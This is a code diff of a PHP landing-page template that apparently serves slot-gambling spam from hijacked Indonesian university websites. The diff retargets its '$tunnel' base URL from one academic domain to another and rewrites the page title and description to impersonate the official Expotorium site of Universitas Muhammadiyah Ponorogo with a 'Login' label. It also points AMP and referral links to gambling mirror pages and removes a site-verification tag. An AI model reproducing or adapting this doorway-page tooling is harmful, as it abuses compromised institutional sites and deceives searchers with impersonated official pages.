@@ -4,12 +4,12 @@ $bigBrand = strtoupper($BRAND);
 $smallBrand = strtolower($BRAND);
 $baseFavIcon = "https://nerlamina.sirv.com/image-bvs/favicon-bvs.png";
 $baseLogo = "https://nerlamina.sirv.com/image-bvs/slot-gacor-terpercaya.png";
-$baseImages = "https://ik.imagekit.io/zgdx/thailand9.jpg";
-$baseURL = "https://cihes.fkunswagati.ac.id/pavi/?$tunnel=".str_replace(" ","%20",$bigBrand);
-$ampURL = "https://fkunswagatipavi.pages.dev/".str_replace(" ","%20",$bigBrand);
-$baseTitle = "$bigBrand Simposium Kesehatan Internasional Cirebon - CIHES";
-$baseDesc = "$bigBrand adalah simposium kesehatan internasional cirebon memiliki perspektif global tentang tantangan dan Inovasi Kesehatan yang akan diselenggarakan di Cirebon.";
-$baseRefURL = "https://fkunswagatipavi.pages.dev/".str_replace(" ","%20",$bigBrand);
+$baseImages = "https://ik.imagekit.io/dx69odpjm/fa095f38ad466795ff92d62e0187accf.jpg";
+$baseURL = "https://expotorium.umpo.ac.id/js/?$tunnel=".str_replace(" ","%20",$bigBrand);
+$ampURL = "https://palinggac0r.pages.dev/".str_replace(" ","%20",$bigBrand);
+$baseTitle = "$bigBrand Login # Website Resmi Expotorium Universitas Muhammadiyah Ponorogo | UMPO";
+$baseDesc = "$bigBrand Login Selamat datang di Website resmi Gedung Expotorium Universitas Muhammadiyah Ponorogo dibangun untuk meningkatkan kapasitas sarana prasarana bagi aktivitas mahasiswa maupun fasilitas forum besar lainnya, yang dalam kurun waktu satu tahun telah berhasil diselesaikan pembangunannya sejak agustus 2018.";
+$baseRefURL = "https://palinggac0r.pages.dev/".str_replace(" ","%20",$bigBrand);
 
 ?>
 <!-- Script Landing Page -->
@@ -18,7 +18,6 @@ $baseRefURL = "https://fkunswagatipavi.pages.dev/".str_replace(" ","%20",$bigBra
     <head>
         <meta charset="utf-8" />
         <base href="<?php echo $baseURL ?>" />
-        <meta name="google-site-verification" content="YKwQCJutXTN1uqVUzCIfKqyG0grcKrgJpW_dQMrSD1A" />
         <title><?php echo $baseTitle ?></title>
         <meta name="description" content="<?php echo $baseDesc ?>" />
         <meta name="keywords" content="<?php echo $bigBrand ?>"/>
